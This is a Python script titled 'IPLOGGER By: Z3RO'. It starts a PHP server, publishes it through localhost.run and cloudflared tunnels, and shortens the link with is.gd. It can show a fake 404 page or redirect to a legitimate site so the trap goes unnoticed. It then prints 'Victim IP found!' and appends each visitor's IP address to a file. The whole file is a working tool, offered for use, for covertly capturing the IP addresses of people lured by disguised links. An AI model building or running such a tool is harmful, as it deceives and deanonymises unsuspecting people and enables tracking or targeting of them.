#!/usr/bin/python3

import os
import time
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
import pyshorteners

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

lh_file = "logs/lh.log"
cf_file = "logs/cf.log"

cf_log = open(cf_file, 'w')
lh_log = open(lh_file, 'w')

if os.path.isfile('server/cloudflared'):
   pass
else:
  print('\n\033[31m[!] Cloudflare not installed')
  print('\n\033[35m[~] Installing cloudflare...')
  os.system("bash modules/install.sh")

logo = """\033[33m
  _____ _____  _      ____   _____  _____ ______ _____  
 |_   _|  __ \| |    / __ \ / ____|/ ____|  ____|  __ \ 
   | | | |__) | |   | |  | | |  __| |  __| |__  | |__) |
   | | |  ___/| |   | |  | | | |_ | | |_ |  __| |  _  / 
  _| |_| |    | |___| |__| | |__| | |__| | |____| | \ \ 
 |_____|_|    |______\____/ \_____|\_____|______|_|  \_\\

                  By: Z3RO
"""

def check():
    while True:
        if os.path.isfile('ip.txt'):
          print()
          print('\n\033[94m[~] Victim IP found!')
          with open('ip.txt') as ip:
            lines = ip.read().rstrip()
            if len(lines) != 0:
                print()

                os.system("cat ip.txt")
                os.system("cat ip.txt >> ip_guardadas.txt")

                print('\n\033[32m[~]IP saved in: ip_guardadas.txt')

                os.remove("ip.txt")
          ip.close()

def server():
    os.system("clear")

    print(logo)

    print('[~] Starting php server...')

    var1 = input('\n[~] Do you want to use the default page? (Error 404 HTML) [Y/n]: ')

    if var1 == "y" or var1 == "Y":
      file = open('index.php', 'r+')
      ler = file.read()
      file.close()
      if "index.html" in ler:
        pass
      else:
        global file2

        os.remove('index.php')

        file2 = open('index.php', 'w')
        file2.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""")
        file2.close()
      print('\n[~] Using port: 8080')
      print('\n[~] Creating link...')

      time.sleep(2)

      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)

      ola = False
      for i in range(10):
         lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
         if lhr_url != "":
              ola = True
              break
         time.sleep(1)

      bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)

      cf_success = False
      for i in range(10):
          cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
          if cf_url != "":
              cf_success = True
              break
          time.sleep(1)

      print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
      print(f'\n\033[32m[~] Cloudflared: {cf_url}')
      try:
          with open('short.txt', 'w') as shorturl:
             s = pyshorteners.Shortener()
             ey = s.isgd.short(lhr_url)
             shorturl.write(ey)

          print(f'\n\033[34m[~] Shortened link: {ey}')
          os.remove('short.txt')
      except:
        print('\n\033[31m[!] An error occurred while trying to shorten the url.')
        pass

      print('\n\033[33m[~] Waiting for data...')
      check() 

    elif var1 == "n" or var1 == "N":
      link = input('\n[~] Enter a url to redirect the victim (e.j: https://youtube.com): ')

      file = open('index.php', 'w')
      file.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""".replace("index.html", link))
      file.close()

      print('\n[~] Using port: 8080')
      print('\n[~] Creating link...')

      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)

      ola = False
      for i in range(10):
         lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
         if lhr_url != "":
              ola = True
              break
         time.sleep(1)
        
      bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)

      cf_success = False
      for i in range(10):
          cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
          if cf_url != "":
              cf_success = True
              break
          time.sleep(1)

      print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
      print(f'\n\033[32m[~] Cloudflared: {cf_url}')
      
      try:
          with open('short.txt', 'w') as shorturl:
             s = pyshorteners.Shortener()
             ey = s.isgd.short(lhr_url)
             shorturl.write(ey)
      except:
        print('\n\033[31m[!] An error occurred while trying to shorten the url.')
        pass

      print(f'\n\033[34m[~] Shortened link: {ey}')

      os.remove('short.txt')

      print('\n[~] Waiting for data...')
      check()

def menu():
    os.system("killall php")
    os.system("clear")

    print(logo)

    print('\n[1] Start server php')
    print('[99] Exit')
    T = int(input('\n>> '))
    if  T == 1:
        server()
    elif T == 99:
        exit()
    else:
        print('\n\033[31m[!] Invalid option error.')
        time.sleep(2)
        menu()

if __name__ == "__main__":  
    menu()
